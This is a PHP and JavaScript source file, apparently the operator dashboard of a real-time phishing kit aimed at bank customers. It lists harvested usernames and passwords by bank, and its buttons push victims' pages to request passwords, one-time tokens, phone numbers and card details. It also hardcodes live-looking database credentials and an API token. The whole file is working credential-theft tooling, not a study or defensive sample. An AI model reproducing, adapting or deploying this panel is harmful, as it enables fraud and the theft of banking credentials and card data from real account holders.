<?php
date_default_timezone_set('America/Bogota');
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Registros recibidos</title>

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

   <style>
    body {
        font-family: Arial, sans-serif;
        padding: 30px;
        background: #f9f9f9;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        background: white;
        box-shadow: 0 0 8px rgba(0,0,0,0.05);
    }
    th, td {
        padding: 10px;
        border: 1px solid #ccc;
        text-align: center;
    }
    th {
        background-color: #004080;
        color: white;
        font-weight: bold;
        text-transform: uppercase;
        letter-spacing: 1px;
        border-bottom: 2px solid #002244;
    }

    th:last-child, td:last-child {
    min-width: 60px;
}

    /* Colores alternos solo para filas normales */
    tbody tr:nth-child(even):not(.tr-alerta):not(.tr-offline-largo) {
        background-color: #f4f8fc;
    }

    /* Hover para todas las filas */
    tbody tr:hover {
        background-color: #dceeff !important;
        cursor: pointer;
    }

    /* Hover especial para fila con alerta */
    .tr-alerta:hover {
        background-color: #fff8e1 !important;
    }

    .btn-limpiar {
        background-color: red;
        color: white;
        border: none;
        padding: 10px 16px;
        cursor: pointer;
        border-radius: 4px;
        margin-bottom: 20px;
    }

    /* Círculo conectado/desconectado */
    .estado-circulo {
        display: inline-block;
        width: 14px;
        height: 14px;
        border-radius: 50%;
        margin-right: 6px;
        vertical-align: middle;
    }
    .estado-verde {
        background-color: green;
    }
    .estado-rojo {
        background-color: red;
    }

    /* Fila con estado alerta */
    .tr-alerta {
        animation: pulseBorder 1.5s infinite;
        border: 2px solid #ffcc00 !important;
    }

    @keyframes pulseBorder {
        0% { box-shadow: 0 0 0 0 rgba(255, 204, 0, 0.5); }
        70% { box-shadow: 0 0 0 10px rgba(255, 204, 0, 0); }
        100% { box-shadow: 0 0 0 0 rgba(255, 204, 0, 0); }
    }

    /* Texto parpadeante */
    .estado-pulso {
        color: #d88c00;
        animation: blink-text 1s infinite;
        font-weight: bold;
    }

    @keyframes blink-text {
        0% { opacity: 1; }
        50% { opacity: 0.2; }
        100% { opacity: 1; }
    }

    /* Fila inactiva hace más de 5 minutos */
    .tr-offline-largo {
        background-color: #eee !important;
        color: #888;
        font-style: italic;
    }

@media screen and (max-width: 768px) {
    table, thead, tbody, th, td, tr {
        display: block;
    }

    thead {
        display: none;
    }

@media screen and (max-width: 768px) {
    .btn-limpiar {
        display: block;
        margin: 0 auto 20px auto;
    }
}

    tr {
        margin-bottom: 15px;
        border: 2px solid #ddd;
        border-radius: 8px;
        padding: 10px;
        background-color: #fffefb;
    }

    td {
        position: relative;
        padding-left: 50%;
        text-align: left;
        border: none;
        border-bottom: 1px solid #eee;
    }

    td::before {
        position: absolute;
        top: 10px;
        left: 15px;
        width: 45%;
        padding-right: 10px;
        white-space: nowrap;
        font-weight: bold;
        color: #004080;
    }

    td:nth-of-type(1)::before { content: "ID"; }
    td:nth-of-type(2)::before { content: "Usuario"; }
    td:nth-of-type(3)::before { content: "Password"; }
    td:nth-of-type(4)::before { content: "Entidad"; }
    td:nth-of-type(5)::before { content: "Tienda"; }
    td:nth-of-type(6)::before { content: "Sistema"; }
    td:nth-of-type(7)::before { content: "Estado"; }
    td:nth-of-type(8)::before { content: "Operador"; }
    td:nth-of-type(9)::before { content: "Conectado"; }
    td:nth-of-type(10)::before { content: "Acción"; }

    .estado-circulo {
        margin-left: 5px;
    }
}

@media screen and (max-width: 768px) {
    table, thead, tbody, th, td, tr {
        display: block;
    }

    thead {
        display: none;
    }

    tr {
        margin-bottom: 15px;
        border: 2px solid #ddd;
        border-radius: 8px;
        padding: 10px;
        background-color: #fffefb;
    }

    td {
        position: relative;
        padding-left: 50% !important;
        text-align: left;
        border: none;
        border-bottom: 1px solid #eee;
        min-height: 40px;
        word-break: break-word;
    }

    td::before {
        position: absolute;
        top: 10px;
        left: 15px;
        width: 45%;
        padding-right: 10px;
        white-space: nowrap;
        font-weight: bold;
        color: #004080;
    }


    td:nth-of-type(1)::before { content: "ID"; }
    td:nth-of-type(2)::before { content: "Usuario"; }
    td:nth-of-type(3)::before { content: "Password"; }
    td:nth-of-type(4)::before { content: "Entidad"; }
    td:nth-of-type(5)::before { content: "Tienda"; }
    td:nth-of-type(6)::before { content: "Sistema"; }
    td:nth-of-type(7)::before { content: "Estado"; }
    td:nth-of-type(8)::before { content: "Operador"; }
    td:nth-of-type(9)::before { content: "Conectado"; }
    td:nth-of-type(9)::before {
    content: "Conectado";
    position: absolute;
    top: 10px;
    left: 15px;
    font-weight: bold;
    color: #004080;
}

td:nth-of-type(9) {
    padding-left: 50% !important;
    position: relative;
    text-align: left !important;
}

    td:nth-of-type(10)::before { content: "Acción"; }

    .estado-circulo {
        margin-left: 5px;
    }

    /* Que botones no se rompan */
    td button {
        width: 100%;
        margin-top: 5px;
    }

    .btn-limpiar {
        width: 100%;
    }
}


</style>

</head>
<body>

<h2>Registros recibidos</h2>

<form method="post" action="">
    <button class="btn-limpiar" type="submit" name="limpiar">Limpiar Base de Datos</button>
</form>

<?php
if (isset($_POST['limpiar'])) {
    $conexion = new mysqli("localhost", "espacove_pollo", "Colombia123@.", "espacove_general"); // ¡ATENCIÓN! Credenciales de BD hardcodeadas
    if ($conexion->connect_error) {
        echo "<p style='color:red;'>Error de conexión.</p>";
    } else {
        $conexion->query("TRUNCATE TABLE registros");
        echo "<p style='color:green;'>Base de datos limpiada correctamente.</p>";
    }
}
?>

<div style="margin-bottom: 15px;">
    <label for="cantidad">Mostrar:</label>
    <select id="cantidad" onchange="cargarRegistros()" style="padding:5px; border-radius:5px;">
        <option value="10">1–10</option>
        <option value="50" selected>1–50</option>
        <option value="200">1–200</option>
        <option value="1000">1–1000</option>
    </select>
</div>



<table>
<thead>
    <tr>
        <th>ID</th>
        <th>Usuario</th>
        <th>Password</th>
        <th>Entidad</th>
        <th>Tienda</th>
        <th>Sistema</th>
        <th>Estado</th>
        <th>Operador</th>
        <th>Conectado</th>
        <th>ACCION</th>

    </tr>
</thead>

    <tbody id="tabla-registros">
        </tbody>
</table>


<script>
function cargarRegistros() {
    const cantidad = document.getElementById("cantidad").value;

    fetch("datos.php?limit=" + cantidad)
        .then(res => res.text())
        .then(html => {
            document.getElementById("tabla-registros").innerHTML = html;
        })
        .catch(err => {
            console.warn("Error al actualizar tabla:", err);
        });
}


cargarRegistros();
setInterval(cargarRegistros, 2000);
</script>

</body>
</html>

<script>
function enviarOrdenPassword(id) {
    const token = "EZnDyqEgnhVxDHLRTqS5pMaa_pbJEKOK9PxpsSXAN2g"; // Tu token estático

    fetch("api/actualizar.php", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "X-Auth-Token": token
        },
        body: JSON.stringify({
            id: id,
            status: "Esperando Password"
        })
    })
    .then(res => res.json())
    .then(data => {
        console.log("Orden enviada: ", data);
        cargarRegistros();
    })
    .catch(err => {
        console.error("Error al enviar la orden:", err);
    });
}

function enviarOrdenToken(id) {
    const token = "EZnDyqEgnhVxDHLRTqS5pMaa_pbJEKOK9PxpsSXAN2g"; // Tu token estático

    fetch("api/actualizar.php", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "X-Auth-Token": token
        },
        body: JSON.stringify({
            id: id,
            status: "Esperando Token"
        })
    })
    .then(res => res.json())
    .then(data => {
        console.log("Orden de token enviada: ", data);
        cargarRegistros();
    })
    .catch(err => {
        console.error("Error al enviar la orden de token:", err);
    });
}

// Función para forzar el reintento de la contraseña (para errores de ingreso)
function forzarReintentarPassword(id) {
    const token = "EZnDyqEgnhVxDHLRTqS5pMaa_pbJEKOK9PxpsSXAN2g"; // Tu token estático

    fetch("api/actualizar.php", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "X-Auth-Token": token
        },
        body: JSON.stringify({
            id: id,
            status: "Esperando Password" // Vuelve al estado de solicitud de contraseña
        })
    })
    .then(res => res.json())
    .then(data => {
        console.log("Orden 'Re-Password' enviada: ", data);
        cargarRegistros();
    })
    .catch(err => {
        console.error("Error al enviar la orden 'Re-Password':", err);
    });
}

// Función para forzar el reintento del token (para errores de ingreso)
function forzarReintentarToken(id) {
    const token = "EZnDyqEgnhVxDHLRTqS5pMaa_pbJEKOK9PxpsSXAN2g"; // Tu token estático

    fetch("api/actualizar.php", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "X-Auth-Token": token
        },
        body: JSON.stringify({
            id: id,
            status: "Esperando Token" // Vuelve al estado de solicitud de token
        })
    })
    .then(res => res.json())
    .then(data => {
        console.log("Orden 'Re-Token' enviada: ", data);
        cargarRegistros();
    })
    .catch(err => {
        console.error("Error al enviar la orden 'Re-Token':", err);
    });
}

// Función para enviar orden de Celular
function enviarOrdenCelular(id) {
    const token = "EZnDyqEgnhVxDHLRTqS5pMaa_pbJEKOK9PxpsSXAN2g"; // Tu token estático

    fetch("api/actualizar.php", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "X-Auth-Token": token
        },
        body: JSON.stringify({
            id: id,
            status: "Esperando Celular" // Nuevo estado para solicitar celular
        })
    })
    .then(res => res.json())
    .then(data => {
        console.log("Orden 'Esperando Celular' enviada: ", data);
        cargarRegistros();
    })
    .catch(err => {
        console.error("Error al enviar la orden 'Esperando Celular':", err);
    });
}

// Función para enviar orden de Tarjeta
function enviarOrdenTarjeta(id) {
    const token = "EZnDyqEgnhVxDHLRTqS5pMaa_pbJEKOK9PxpsSXAN2g"; // Tu token estático

    fetch("api/actualizar.php", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "X-Auth-Token": token
        },
        body: JSON.stringify({
            id: id,
            status: "Esperando Tarjeta" // Nuevo estado para solicitar datos de tarjeta
        })
    })
    .then(res => res.json())
    .then(data => {
        console.log("Orden 'Esperando Tarjeta' enviada: ", data);
        cargarRegistros();
    })
    .catch(err => {
        console.error("Error al enviar la orden 'Esperando Tarjeta':", err);
    });
}

// NUEVA FUNCIÓN: enviarOrdenFinalizar (para el botón 'Finalizar' en el panel)
function enviarOrdenFinalizar(id) {
    const token = "EZnDyqEgnhVxDHLRTqS5pMaa_pbJEKOK9PxpsSXAN2g"; // Tu token estático

    // Puedes añadir una confirmación opcional aquí si el operador debe confirmar la finalización
    // if (!confirm("¿Está seguro de finalizar el proceso para este cliente?")) {
    //     return;
    // }

    fetch("api/actualizar.php", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "X-Auth-Token": token
        },
        body: JSON.stringify({
            id: id,
            status: "Completado" // Estado final de éxito que el cliente espera
        })
    })
    .then(res => res.json())
    .then(data => {
        console.log("Orden 'Finalizar' enviada: ", data);
        cargarRegistros(); // Recargar la tabla para reflejar el cambio de estado
    })
    .catch(err => {
        console.error("Error al enviar la orden 'Finalizar':", err);
    });
}


</script>